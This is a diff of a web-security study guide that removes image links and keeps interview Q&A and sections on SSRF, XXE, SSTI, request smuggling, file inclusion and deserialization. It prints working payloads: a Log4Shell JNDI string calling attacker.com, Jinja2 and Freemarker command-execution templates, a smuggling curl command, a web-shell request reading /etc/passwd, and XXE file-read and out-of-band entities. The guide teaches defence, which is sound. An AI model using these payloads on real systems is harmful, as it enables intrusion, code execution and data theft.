-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-ssrf-and-what-is-the-impact-handwritten.svg" alt="Handwritten: What is SSRF and what is the impact?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-ssrf-and-what-is-the-impact-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-ssrf-and-what-is-the-impact-diagram.svg" alt="Diagram: What is SSRF and what is the impact?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-ssrf-and-what-is-the-impact-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-ssrf-and-what-is-the-impact-sticky.svg" alt="Sticky Note: What is SSRF and what is the impact?" width="30%">
-</a>
 
 
 **Answer:** Server-Side Request Forgery allows an attacker to make the server send requests to arbitrary URLs. Impact: read cloud metadata (IAM credentials), access internal services behind firewalls, port-scan internal networks. The most famous example is the 2019 Capital One breach where SSRF led to 100M records stolen.
 ### Q7: Explain the difference between authentication and authorization.
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/explain-the-difference-between-authentication-and-authorization-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/explain-the-difference-between-authentication-and-authorization-handwritten.svg" alt="Handwritten: Explain the difference between authentication and authorization." width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/explain-the-difference-between-authentication-and-authorization-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/explain-the-difference-between-authentication-and-authorization-diagram.svg" alt="Diagram: Explain the difference between authentication and authorization." width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/explain-the-difference-between-authentication-and-authorization-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/explain-the-difference-between-authentication-and-authorization-sticky.svg" alt="Sticky Note: Explain the difference between authentication and authorization." width="30%">
-</a>
-
 
 **Answer:** Authentication verifies identity ("who you are"). Authorization verifies permissions ("what you can do"). A common vulnerability is broken access control where authentication is correct but authorization is missing. OWASP A01 (Broken Access Control) focuses on authorization failures.
 ### Q8: What is XXE and how does it work?
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-xxe-and-how-does-it-work-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-xxe-and-how-does-it-work-handwritten.svg" alt="Handwritten: What is XXE and how does it work?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-xxe-and-how-does-it-work-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-xxe-and-how-does-it-work-diagram.svg" alt="Diagram: What is XXE and how does it work?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-xxe-and-how-does-it-work-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-xxe-and-how-does-it-work-sticky.svg" alt="Sticky Note: What is XXE and how does it work?" width="30%">
-</a>
 
 
 **Answer:** XML External Entity injection exploits XML parsers that process external entities. The attacker defines an entity that reads local files, makes HTTP requests, or causes DoS. Prevention: disable DTD processing entirely in XML parsers. Better: use JSON instead of XML.
 ### Q9: What is the Log4Shell vulnerability?
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-log4shell-vulnerability-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-log4shell-vulnerability-handwritten.svg" alt="Handwritten: What is the Log4Shell vulnerability?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-log4shell-vulnerability-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-log4shell-vulnerability-diagram.svg" alt="Diagram: What is the Log4Shell vulnerability?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-log4shell-vulnerability-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-log4shell-vulnerability-sticky.svg" alt="Sticky Note: What is the Log4Shell vulnerability?" width="30%">
-</a>
-
 
 **Answer:** CVE-2021-44228 (Log4Shell) is an RCE in Apache Log4j 2.x. When user-controlled data is logged, Log4j processes JNDI lookups like `${jndi:ldap://attacker.com/a}`, loading remote code. Impact: hundreds of millions of devices affected. This highlights OWASP A06 (Vulnerable Components).
 ### Q10: How does HTTPS protect against MITM attacks?
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-https-protect-against-mitm-attacks-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-https-protect-against-mitm-attacks-handwritten.svg" alt="Handwritten: How does HTTPS protect against MITM attacks?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-https-protect-against-mitm-attacks-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-https-protect-against-mitm-attacks-diagram.svg" alt="Diagram: How does HTTPS protect against MITM attacks?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-https-protect-against-mitm-attacks-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-https-protect-against-mitm-attacks-sticky.svg" alt="Sticky Note: How does HTTPS protect against MITM attacks?" width="30%">
-</a>
 
 
 **Answer:** HTTPS uses TLS to provide: (1) Encryption → data is encrypted so eavesdroppers cannot read it. (2) Authentication → server presents a certificate signed by a trusted CA. (3) Integrity → TLS MAC ensures data was not modified in transit.
 ### Q11: What is deserialization attack and how does ysoserial work?
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-deserialization-attack-and-how-does-ysoserial-work-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-deserialization-attack-and-how-does-ysoserial-work-handwritten.svg" alt="Handwritten: What is deserialization attack and how does ysoserial work?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-deserialization-attack-and-how-does-ysoserial-work-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-deserialization-attack-and-how-does-ysoserial-work-diagram.svg" alt="Diagram: What is deserialization attack and how does ysoserial work?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-deserialization-attack-and-how-does-ysoserial-work-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-deserialization-attack-and-how-does-ysoserial-work-sticky.svg" alt="Sticky Note: What is deserialization attack and how does ysoserial work?" width="30%">
-</a>
-
 
 **Answer:** Deserialization attacks exploit applications that deserialize untrusted data. Java's ObjectInputStream.readObject() can execute arbitrary code if the serialized data contains a "gadget chain". ysoserial generates these gadget chains for common libraries. Prevention: never deserialize untrusted data, use JSON instead.
 ### Q12: What is HTTP Request Smuggling?
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-http-request-smuggling-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-http-request-smuggling-handwritten.svg" alt="Handwritten: What is HTTP Request Smuggling?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-http-request-smuggling-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-http-request-smuggling-diagram.svg" alt="Diagram: What is HTTP Request Smuggling?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-http-request-smuggling-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-http-request-smuggling-sticky.svg" alt="Sticky Note: What is HTTP Request Smuggling?" width="30%">
-</a>
 
 
 **Answer:** HTTP Request Smuggling exploits discrepancies between front-end and back-end servers in parsing Content-Length and Transfer-Encoding headers. An attacker crafts an ambiguous request that the front-end interprets as one request but the back-end sees as two. Fix: consistent parsing, reject ambiguous requests, use HTTP/2.
 ### Q13: What is the difference between WAF and RASP?
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-waf-and-rasp-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-waf-and-rasp-handwritten.svg" alt="Handwritten: What is the difference between WAF and RASP?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-waf-and-rasp-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-waf-and-rasp-diagram.svg" alt="Diagram: What is the difference between WAF and RASP?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-waf-and-rasp-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-waf-and-rasp-sticky.svg" alt="Sticky Note: What is the difference between WAF and RASP?" width="30%">
-</a>
-
 
 **Answer:** WAF operates at the network edge, inspecting HTTP requests using signatures. It blocks known attack patterns but can be bypassed. RASP runs inside the application, intercepting actual code execution. It sees parsed, normalized data → harder to bypass. RASP blocks both known and unknown attacks but requires agent integration.
 ### Q14: How do you test for SSTI?
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/how-do-you-test-for-ssti-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/how-do-you-test-for-ssti-handwritten.svg" alt="Handwritten: How do you test for SSTI?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/how-do-you-test-for-ssti-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/how-do-you-test-for-ssti-diagram.svg" alt="Diagram: How do you test for SSTI?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/how-do-you-test-for-ssti-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/how-do-you-test-for-ssti-sticky.svg" alt="Sticky Note: How do you test for SSTI?" width="30%">
-</a>
-
 
 **Answer:** Inject template expressions and observe the response. Test: `{{7*7}}` → if response contains "49", SSTI confirmed. For Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`. For Freemarker: `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}`.
 ### Q15: What is a bug bounty program and how do you approach it?
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-a-bug-bounty-program-and-how-do-you-approach-it-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-a-bug-bounty-program-and-how-do-you-approach-it-handwritten.svg" alt="Handwritten: What is a bug bounty program and how do you approach it?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-a-bug-bounty-program-and-how-do-you-approach-it-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-a-bug-bounty-program-and-how-do-you-approach-it-diagram.svg" alt="Diagram: What is a bug bounty program and how do you approach it?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-a-bug-bounty-program-and-how-do-you-approach-it-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-a-bug-bounty-program-and-how-do-you-approach-it-sticky.svg" alt="Sticky Note: What is a bug bounty program and how do you approach it?" width="30%">
-</a>
 
 
 **Answer:** A bug bounty program offers rewards for finding security vulnerabilities. Approach: (1) Recon → enumerate subdomains, endpoints, tech stack. (2) Automated scanning → run tools with throttle. (3) Manual testing → focus on logic flaws. (4) Exploitation → prove impact without damage. (5) Report → clear, reproducible steps with PoC. Top categories: XSS, IDOR, SSRF.
@@ -1947,16 +1296,6 @@ Industry benchmarks:
 ## 27. Summary
 
 ### Key Mitigation Matrix
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/key-mitigation-matrix-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/key-mitigation-matrix-handwritten.svg" alt="Handwritten: Key Mitigation Matrix" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/key-mitigation-matrix-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/key-mitigation-matrix-diagram.svg" alt="Diagram: Key Mitigation Matrix" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/key-mitigation-matrix-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/key-mitigation-matrix-sticky.svg" alt="Sticky Note: Key Mitigation Matrix" width="30%">
-</a>
 
 
 | Attack | Primary Defense | Secondary Defense |
@@ -1977,16 +1316,6 @@ Industry benchmarks:
 
 ### Core Takeaways
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/core-takeaways-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/core-takeaways-handwritten.svg" alt="Handwritten: Core Takeaways" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/core-takeaways-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/core-takeaways-diagram.svg" alt="Diagram: Core Takeaways" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/core-takeaways-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/core-takeaways-sticky.svg" alt="Sticky Note: Core Takeaways" width="30%">
-</a>
-
 
 - OWASP Top 10 (2021) → ten critical web risks ranked by exploitability, prevalence, and impact
 - Injection (A03) → separate data from commands with parameterized queries
@@ -1999,16 +1328,6 @@ Industry benchmarks:
 - Bug Bounty → recon, exploit, report with clear PoC
 - Case Studies → Equifax (unpatched Struts), GitHub (memcached amplification), Facebook (SSRF + DNS rebinding), British Airways (third-party JS skimmer)
 ### Attack Comparison Table
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-comparison-table-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-comparison-table-handwritten.svg" alt="Handwritten: Attack Comparison Table" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-comparison-table-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-comparison-table-diagram.svg" alt="Diagram: Attack Comparison Table" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-comparison-table-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-comparison-table-sticky.svg" alt="Sticky Note: Attack Comparison Table" width="30%">
-</a>
 
 
 | Attack | Root Cause | Standard Prevention | Advanced Prevention |
@@ -2154,16 +1473,6 @@ Architecture: WAF (ModSecurity with OWASP CRS) in front. CSP with nonces. SSRF p
 **Technical Explanation:** Attacker tricks the server into making requests to internal resources that the server can access but the attacker cannot directly.
 ### Attack Steps
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-handwritten.svg" alt="Handwritten: Attack Steps" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-diagram.svg" alt="Diagram: Attack Steps" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-sticky.svg" alt="Sticky Note: Attack Steps" width="30%">
-</a>
-
 
 1. Application fetches a document URL based on user input
 2. Attacker changes URL to internal metadata service endpoint
@@ -2227,16 +1536,6 @@ def fetch_url():
 `
 ### SSRF Types
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/ssrf-types-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/ssrf-types-handwritten.svg" alt="Handwritten: SSRF Types" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/ssrf-types-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/ssrf-types-diagram.svg" alt="Diagram: SSRF Types" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/ssrf-types-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/ssrf-types-sticky.svg" alt="Sticky Note: SSRF Types" width="30%">
-</a>
-
 
 | Type | Behavior | Blind? | Exfiltration Method |
 
@@ -2254,16 +1553,6 @@ def fetch_url():
 **Real-World Analogy:** Accepting a sealed package from a stranger and opening it without checking who sent it.
 **Technical Explanation:** Untrusted data is deserialized into objects. Attackers craft malicious serialized objects that execute arbitrary code when deserialized.
 ### Attack Steps
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-handwritten.svg" alt="Handwritten: Attack Steps" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-diagram.svg" alt="Diagram: Attack Steps" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-sticky.svg" alt="Sticky Note: Attack Steps" width="30%">
-</a>
 
 
 1. Application deserializes cookie/session data via readObject()
@@ -2314,32 +1603,12 @@ public &lt;T> T safeDeserialize(String json, Class<T&gt; type) {
 **Technical Explanation:** Discrepancy between front-end (proxy/load balancer) and back-end in parsing Content-Length vs. Transfer-Encoding headers allows attacker to smuggle requests.
 ### Attack Steps
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-handwritten.svg" alt="Handwritten: Attack Steps" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-diagram.svg" alt="Diagram: Attack Steps" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-sticky.svg" alt="Sticky Note: Attack Steps" width="30%">
-</a>
-
 
 1. Front-end uses Content-Length, back-end uses Transfer-Encoding
 2. Attacker crafts ambiguous request
 3. Front-end forwards entire body, back-end sees second request
 4. Smuggled request accesses internal endpoints
 ### CL.TE Exploit Example
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/cl-te-exploit-example-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/cl-te-exploit-example-handwritten.svg" alt="Handwritten: CL.TE Exploit Example" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/cl-te-exploit-example-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/cl-te-exploit-example-diagram.svg" alt="Diagram: CL.TE Exploit Example" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/cl-te-exploit-example-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/cl-te-exploit-example-sticky.svg" alt="Sticky Note: CL.TE Exploit Example" width="30%">
-</a>
 
 
 `http
@@ -2353,31 +1622,11 @@ X:
 `
 ### Detection
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/detection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/detection-handwritten.svg" alt="Handwritten: Detection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/detection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/detection-diagram.svg" alt="Diagram: Detection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/detection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/detection-sticky.svg" alt="Sticky Note: Detection" width="30%">
-</a>
-
 
 `ash
 curl -k ""https://example.com/"" -H ""Transfer-Encoding: chunked"" -d ""0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n""
 `
 ### Mitigation
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-handwritten.svg" alt="Handwritten: Mitigation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-diagram.svg" alt="Diagram: Mitigation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-sticky.svg" alt="Sticky Note: Mitigation" width="30%">
-</a>
 
 
 - Consistent parsing between front-end and back-end
@@ -2440,16 +1689,6 @@ GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1
 
 ### Local File Inclusion (LFI)
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/local-file-inclusion-lfi-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/local-file-inclusion-lfi-handwritten.svg" alt="Handwritten: Local File Inclusion (LFI)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/local-file-inclusion-lfi-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/local-file-inclusion-lfi-diagram.svg" alt="Diagram: Local File Inclusion (LFI)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/local-file-inclusion-lfi-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/local-file-inclusion-lfi-sticky.svg" alt="Sticky Note: Local File Inclusion (LFI)" width="30%">
-</a>
-
 
 **Real-World Analogy:** Asking a librarian to read any book from the shelves - even restricted ones.
 #### Vulnerable Code
@@ -2489,16 +1728,6 @@ expect://id
 `
 ### Remote File Inclusion (RFI)
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/remote-file-inclusion-rfi-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/remote-file-inclusion-rfi-handwritten.svg" alt="Handwritten: Remote File Inclusion (RFI)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/remote-file-inclusion-rfi-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/remote-file-inclusion-rfi-diagram.svg" alt="Diagram: Remote File Inclusion (RFI)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/remote-file-inclusion-rfi-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/remote-file-inclusion-rfi-sticky.svg" alt="Sticky Note: Remote File Inclusion (RFI)" width="30%">
-</a>
-
 
 `php
 <?php include([""page""]); ?>
@@ -2528,16 +1757,6 @@ if (in_array(, )) {
 **Technical Explanation:** XML parser processes external entities defined in the DTD, allowing file reads, SSRF, and DoS.
 ### XXE to Read Files
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-to-read-files-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-to-read-files-handwritten.svg" alt="Handwritten: XXE to Read Files" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-to-read-files-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-to-read-files-diagram.svg" alt="Diagram: XXE to Read Files" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-to-read-files-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-to-read-files-sticky.svg" alt="Sticky Note: XXE to Read Files" width="30%">
-</a>
-
 
 `xml
 <?xml version=""1.0"" encoding=""UTF-8""?>
@@ -2547,16 +1766,6 @@ if (in_array(, )) {
 <root>&xxe;</root>
 `
 ### XXE to SSRF
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-to-ssrf-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-to-ssrf-handwritten.svg" alt="Handwritten: XXE to SSRF" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-to-ssrf-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-to-ssrf-diagram.svg" alt="Diagram: XXE to SSRF" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-to-ssrf-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-to-ssrf-sticky.svg" alt="Sticky Note: XXE to SSRF" width="30%">
-</a>
 
 
 `xml
@@ -2568,16 +1777,6 @@ if (in_array(, )) {
 `
 ### XXE Blind (Out-of-Band)
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-blind-out-of-band-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-blind-out-of-band-handwritten.svg" alt="Handwritten: XXE Blind (Out-of-Band)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-blind-out-of-band-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-blind-out-of-band-diagram.svg" alt="Diagram: XXE Blind (Out-of-Band)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-blind-out-of-band-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xxe-blind-out-of-band-sticky.svg" alt="Sticky Note: XXE Blind (Out-of-Band)" width="30%">
-</a>
-
 
 `xml
 <?xml version=""1.0"" encoding=""UTF-8""?>
@@ -2588,16 +1787,6 @@ if (in_array(, )) {
 <root>&send;</root>
 `
 ### Billion Laughs Attack (DoS)
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/billion-laughs-attack-dos-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/billion-laughs-attack-dos-handwritten.svg" alt="Handwritten: Billion Laughs Attack (DoS)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/billion-laughs-attack-dos-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/billion-laughs-attack-dos-diagram.svg" alt="Diagram: Billion Laughs Attack (DoS)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/billion-laughs-attack-dos-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/billion-laughs-attack-dos-sticky.svg" alt="Sticky Note: Billion Laughs Attack (DoS)" width="30%">
-</a>
 
 
 `xml
@@ -2611,16 +1800,6 @@ if (in_array(, )) {
 `
 ### Vulnerable Code
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-handwritten.svg" alt="Handwritten: Vulnerable Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-diagram.svg" alt="Diagram: Vulnerable Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-sticky.svg" target="_blank" rel="noopener">
